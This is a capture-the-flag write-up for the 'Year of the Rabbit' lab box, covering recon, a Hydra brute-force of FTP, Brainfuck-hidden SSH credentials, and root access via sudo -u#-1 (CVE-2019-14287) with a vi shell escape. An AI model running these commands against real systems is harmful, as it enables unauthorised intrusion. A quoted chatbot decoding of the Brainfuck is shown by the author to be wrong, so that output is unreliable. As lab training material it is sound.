#CTF 

_Let's have a nice gentle start to the New Year!  
Can you hack into the Year of the Rabbit box without falling down a hole?_

**_(Please ensure your volume is turned up!)_**

## Recon

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.16.45/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/08/15 10:09:14 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.10.16.45/assets/]                                                                
/index.html           (Status: 200) [Size: 7853]
/index.html           (Status: 200) [Size: 7853]
/server-status        (Status: 403) [Size: 276]
Progress: 18163 / 18460 (98.39%)
===============================================================
2023/08/15 10:09:48 Finished
===============================================================
```

/assets contain

|Name|Last Modified|Size|Descrption|
|---|---|---|---|---|
|Parent Directory||-||
|RickRolled.mp4|2020-01-23 00:34|384M||
|style.css|2020-01-23 00:34|2.9K||

## Access 

I don't have much to look at this point. RickRolled.mp4 is the famous get trolled video with nothing much other than that. So the only thing left is style.css. I take a look around and find
this comment
```
 /* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

So I navigate there and I get a popup saying
`Word of advice... Turn off your javascript...`, if I press ok I get redirected to the rick rolled video on youtube. I block the javascript with a web plugin an I get
```
Love it when people block Javascript...  
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!  
Make sure your audio is turned up!
```

I disable the plugin and try again, while I look on the network tab I catch this
`GET http://10.10.16.45/intermediary.php?hidden_directory=/WExYY2Cv-qU`
which is getting invoked before the load of /sup3r_s3cret_fl4g
So I navigate the and find

Hot_Babe.png|2020-01-23 00:34|464K|
I download the image and I run strings on it

I get a bunch of nonsense, BUT near the end I find this
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

So I have the username and a potential password. I save the passwords on a file and I use Hydra to brute-force my entrance on the ftp port with
`hydra -l ftpuser -P passwords.txt ftp://10.10.16.45`
and get the password
`[21][ftp] host: 10.10.16.45   login: ftpuser   password: 5iez1wGXKfPKQ`
So I login ftp and find
`-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt`
I get the find and print it

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

It looks like morse code, but I don't know what am I looking at.
I throw it on gpt and I get
```
The text you provided seems to be a Brainfuck program, a minimalist esoteric programming language. Brainfuck uses a very limited set of commands to manipulate memory cells and produce output.
```
And the output is
```
Hello World! Bring back the good old days!
```

I wasn't convinced so I tried it on an online decoder and got
```
User: eli
Password: DSpDiM1wAEwid
```

So I ssh and get in! I find this
```
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

I dont see a flag around so I am looking for the s3cr3t place with `locate` and find 
```
/usr/games/s3cr3t                                                                       
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!                                
/var/www/html/sup3r_s3cr3t_fl4g.php  
```

I cat the message

```
Your password is awful, Gwendoline.                                                                                                                                                                                                         
It should be at least 60 characters long! Not just MniVCQVhQHUNI                                                                                                                                                                           
Honestly!                                                                               
Yours sincerely                                                                         
   -Root     
```

So I su to Gwendoline with the above password and I find my first flag
`THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`


## Priv Esc

I sudo -l
```
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

I search online how to get root with vim on a file and I find this [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
and with this
### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#cve-2019-14287)CVE-2019-14287

```powershell
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

I use `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
then in type `:!/bin/sh` and I am root!
I get my flag `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`